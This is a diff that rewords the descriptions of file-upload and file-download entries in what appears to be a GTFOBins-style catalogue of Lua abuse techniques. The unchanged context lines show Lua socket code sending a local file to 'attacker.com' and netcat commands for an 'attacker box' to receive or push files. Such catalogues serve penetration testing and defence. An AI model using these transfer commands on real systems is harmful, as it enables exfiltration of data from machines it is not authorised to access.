@@ -27,7 +27,7 @@ functions:
             local b=assert(f:read("*a"));c:send(b);
           end;c:close();f:close();'
   file-upload:
-    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
+    - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
       code: |
         RHOST=attacker.com
         RPORT=12345
@@ -42,7 +42,7 @@ functions:
           t:send(d);
           t:close();'
   file-download:
-    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345
+    - description: Fetch a remote file via TCP. Run `nc target.com 12345
         < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
       code: |
         export LPORT=12345
